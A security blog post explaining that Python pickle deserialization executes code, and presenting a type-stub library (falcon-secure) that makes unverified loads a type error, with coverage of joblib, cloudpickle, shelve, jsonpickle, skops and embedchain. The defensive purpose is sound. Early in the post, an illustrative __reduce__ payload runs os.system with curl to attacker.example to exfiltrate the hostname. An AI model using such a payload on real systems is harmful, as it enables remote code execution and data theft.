---
title: 'Pickle Is a CVE Factory; Type Stubs Are the Gate'
description: 'Every ML project eventually loads a pickle file. This is a problem: pickle can execute arbitrary Python on deserialization. Here is how falcon-secure uses Python type stubs to make unsafe loads a static type error.'
pubDate: 'May 01 2026'
tags: ["security", "python", "pickle", "ml-ops", "type-stubs"]
series: "Type-Stub Security Gates for ML Deserialization"
seriesOrder: 1
---

```python
model = pickle.load(open(model_file, 'rb'))
```

You have written this line. So has everyone who has ever loaded a scikit-learn pipeline, a PyTorch checkpoint, or a huggingface tokenizer config. It is in the CVE database. A lot.

This post is about why that line is dangerous, why the obvious mitigations don't work, and how [`falcon-secure`](https://github.com/d3banjan/falcon) uses Python type stubs to turn unsafe deserialization into a static type error before it ever runs.

---

## Why pickle is dangerous

Pickle is not a data serialization format. It is a **program serialization format**.

When Python pickles an object, it serializes the *instructions to reconstruct that object* — not the object's data. When you unpickle, Python executes those instructions. The attack surface lives entirely in that execution model.

The simplest exploit: any class can define a `__reduce__` method that tells pickle how to reconstruct it. Pickle calls that method faithfully during load. There is no validation. There is no sandbox.

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl https://attacker.example/exfil?h=$(hostname)',))

payload = pickle.dumps(Exploit())
# Somewhere else, a well-meaning engineer runs:
pickle.loads(payload)
# curl fires. The model "loaded" successfully.
```

This is not theoretical. The National Vulnerability Database has CVEs against scikit-learn pipelines, Hugging Face model loading paths, and MLflow artifact stores — all pickle-backed, all exploitable by a malicious artifact.

### Which packages wrap pickle without securing it

The problem compounds because pickle is hidden behind friendlier APIs:

- **joblib** — scikit-learn's default serializer for `dump`/`load`. Joblib serializes numpy arrays efficiently, but model objects are pickled directly.
- **cloudpickle** — extends pickle to handle lambdas and closures. Used heavily in distributed ML (Dask, Ray, Spark). Because it can pickle *more* things, it can also execute more things.
- **shelve** — the standard library's key-value store. Stores values as pickled bytes. Opening a shelve database from an untrusted source is equivalent to `exec`-ing a Python file you've never read.
- **jsonpickle** — serializes Python objects to JSON *but embeds type information and reconstructs via pickle semantics*. The JSON encoding gives a false sense of text-safety.

Each of these is a pickle vector. Each has CVE history.

---

## The naive mitigations and why they fail

### Custom unpickler

The standard defensive advice is to subclass `pickle.Unpickler` and override `find_class` to allowlist acceptable types:

```python
class SafeUnpickler(pickle.Unpickler):
    ALLOWED = {('sklearn.linear_model', 'LogisticRegression'), ...}

    def find_class(self, module, name):
        if (module, name) not in self.ALLOWED:
            raise pickle.UnpicklingError(f"Blocked: {module}.{name}")
        return super().find_class(module, name)
```

This blocks *global lookups* — every callable pickle resolves by name passes through `find_class`, so naive `os.system`-style payloads get caught. What it does not catch: callables that *are* on the allowlist but have exploitable side effects (object constructors that write files, `__setstate__` methods that call back into the import system, gadget chains assembled from "safe" sklearn classes). The CPython docs themselves note that `find_class` is necessary but not sufficient — an allowlist of legitimate ML classes is still a Turing-complete attack surface if any of those classes do anything interesting on construction.

### "Only load trusted files"

This is an assertion, not a proof. Trust is a claim about provenance. The file system cannot make that claim — you get a path and some bytes. Whether those bytes came from a legitimate training run or were replaced by a supply-chain attack is not encoded anywhere in the file.

Cryptographic signatures on model files help, but they have to be verified *before* the file is opened. That verification step is manual, easy to skip, and not enforced by any Python API.

---

## The type-stub approach

Here is the insight: if we cannot make `pickle.loads` safe, we can make *calling it unsafely* a type error.

Python type stubs (`.pyi` files) let you declare types that do not exist at runtime. A stub is just for the type checker — `mypy`, `pyright`, or `basedpyright` — and carries no runtime overhead. That means we can invent types that represent *verified provenance* without touching the actual pickle code.

`falcon-secure` defines a `TrustedBytes` type:

```python
# falcon_secure/pickle.pyi
from typing import NewType

TrustedBytes = NewType("TrustedBytes", bytes)

def loads(data: TrustedBytes, **kwargs) -> object: ...

def trust(data: bytes, *, provenance: str) -> TrustedBytes: ...
```

`TrustedBytes` is a `NewType` — at runtime it is just `bytes`, but the type checker treats it as a distinct, incompatible type. You cannot pass raw `bytes` where `TrustedBytes` is expected.

The consequence: this fails the type check:

```python
import falcon_secure.pickle as fpickle

raw = open("model.pkl", "rb").read()
fpickle.loads(raw)  # error: Argument 1 to "loads" has incompatible type "bytes"; expected "TrustedBytes"
```

And this passes:

```python
trusted = fpickle.trust(raw, provenance="s3://mlflow-artifacts/run-123/model.pkl")
obj = fpickle.loads(trusted)
```

The `trust()` call is where your verification logic lives — signature checks, hash pinning, allowlist checks against a registry of known-good artifact paths. The point is that `trust()` is an *explicit decision point* that shows up in code review, audit logs, and static analysis. Passing raw bytes to `loads` is not a warning; it is an error that CI blocks on.

This pattern is not new — it appears in Haskell's `IO` monad and Rust's `unsafe` blocks. Making dangerous operations syntactically visible so they cannot be accidentally introduced by a junior engineer or a code-generation tool is the entire point.

---

## Coverage: what falcon-secure wraps

The library wraps six deserialization surfaces. Each was included because it appeared in real CVE reports or security incident analyses, not because it was theoretically possible.

**pickle** — the root. `falcon_secure.pickle` wraps `loads` and `load` with `TrustedBytes` guards. The test suite includes fixture files for deserialization attacks via `__reduce__`.

**shelve** — `falcon_secure.shelve` wraps `open()`. The returned shelf object's `__getitem__` is typed to accept only keys that have been validated against a `TrustedDatabase` wrapper. Opening a shelf from an untrusted path is a type error.

**cloudpickle** — the distributed ML serializer. `falcon_secure.cloudpickle` adds `TrustedBytes` to cloudpickle's `loads` surface. The risk here is heightened because cloudpickle's extended type coverage means more Python constructs can be embedded and executed.

**jsonpickle** — the deceptive one. The JSON encoding tricks engineers into treating the payload as text-safe. `falcon_secure.jsonpickle` stubs `decode()` to require `TrustedStr` (a `NewType` over `str`), making it obvious that the JSON string is not data — it is executable.

**skops** — the scikit-learn secure serialization format. Skops was designed as a pickle replacement, but its trust model (`trusted=` parameter) is a runtime argument that can be passed incorrectly or forgotten. `falcon_secure.skops` stubs `loads` to require that the trusted types list be provided via a `TrustedTypeList` wrapper, making omission a type error rather than a runtime footgun.

**embedchain** — included because LLM application stacks are a new attack surface. Embedchain's knowledge base serialization uses pickle under the hood. The CVE triage page on the falcon-secure microsite documents the specific paths.

---

## What this buys you in practice

Adding `falcon-secure` to a project and running `mypy --strict` will surface every location where raw bytes flow into a deserialization function. That list is your attack surface inventory. Some of those callsites genuinely need to load from trusted sources — wrap them in `trust()` with a `provenance=` string that documents what "trusted" means in context. Others will turn out to be unnecessary or replaceable.

The type errors are not noise. They are a map of where the project has implicit trust assumptions that have never been made explicit.

CI integration is the forcing function. Add `mypy` or `pyright` to your pipeline, add `falcon-secure` to your dev dependencies, and the gate is automatic. A PR that adds `pickle.loads(raw_bytes)` — even indirectly through joblib or cloudpickle — will not pass type checking.

This does not make your application secure. It makes your application's trust assumptions *visible and auditable*. That is a necessary precondition for security, and it is currently missing from most ML codebases.

---

The next post in this series goes further: using Lean 4 to formally prove that a well-typed program cannot reach the dangerous code path, not just that a type checker agrees it can't. Type stubs say "the checker is satisfied." Proofs say "no execution in this model violates the invariant." Read it at [/blog/2026-05-02-falcon-lean-soundness/](/blog/2026-05-02-falcon-lean-soundness/).
